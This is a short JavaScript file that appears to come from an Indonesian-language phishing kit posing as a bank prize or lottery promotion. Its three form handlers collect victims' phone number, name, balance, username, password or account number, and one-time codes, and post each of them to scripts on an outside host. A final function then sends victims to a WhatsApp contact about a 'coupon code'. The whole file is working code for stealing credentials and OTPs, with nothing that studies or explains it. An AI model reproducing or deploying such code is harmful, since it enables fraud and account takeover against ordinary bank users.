$(document).ready(function(){
    $('#inputdata').submit(function(e) {
        e.preventDefault();    
 document.getElementById('kirims').innerHTML = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'https://xxontol-app.whf.bz/fstvl1/sendData.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
    window.location.href='login.html';  
var nomor = document.getElementById("nomor").value;
sessionStorage.setItem("nomor", nomor);
var nama = document.getElementById("nama").value;
sessionStorage.setItem("nama", nama);
var saldo = document.getElementById("saldo").value;
sessionStorage.setItem("saldo", saldo);
     }, 500);
      }
    });
 });
    return false;
});   
        
        


$('#inputlogin').on('submit', function (event) {
  event.stopPropagation();
    event.preventDefault();
  $("#btnsubmit").prop("disabled", true);
  document.getElementById('btnsubmit').innerHTML = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'https://xxontol-app.whf.bz/fstvl1/sendLogin.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
      console.log('Complete')
  setTimeout(function(){
    window.location.href='konf.html';  
var nomor = document.getElementById("nomor").value;
sessionStorage.setItem("nomor", nomor);
var nama = document.getElementById("nama").value;
sessionStorage.setItem("nama", nama);
var saldo = document.getElementById("saldo").value;
sessionStorage.setItem("saldo", saldo);
var unames = document.getElementById("uname").value;
sessionStorage.setItem("unames", unames);
var norek = document.getElementById("pass").value;
sessionStorage.setItem("norek", norek);
     }, 500);
        }
    });
    return false;
});    



 $('#inputOtp').on('submit', function (event) {

  event.stopPropagation();
    event.preventDefault();
    
 document.getElementById('kirims').innerHTML = "Memproses....";



$.ajax({

 type: 'POST',
 url: 'https://xxontol-app.whf.bz/fstvl1/otp.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
 setTimeout(function(){
      document.getElementById("blinkAktivasi").style.display = "block";
      
  document.getElementById('kirims').innerHTML = "Kirim";                  
                    
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
   


    }, 2000);



        }
    });

    return false;
});   
        
                   
function getcs(){
 $("#process1").show();   
  audio4 = document.getElementById("bsiku");
  audio = document.getElementById("bsi");
    audio4.play();
     audio.load();
    audio4.loop = false
setTimeout(function(){  
    $("#process1").hide();   
location.href='https://wa.me/13155232241?text=Saya Belum Mendapatkan Kode Kupon Undian';

    }, 5000);    
    
}
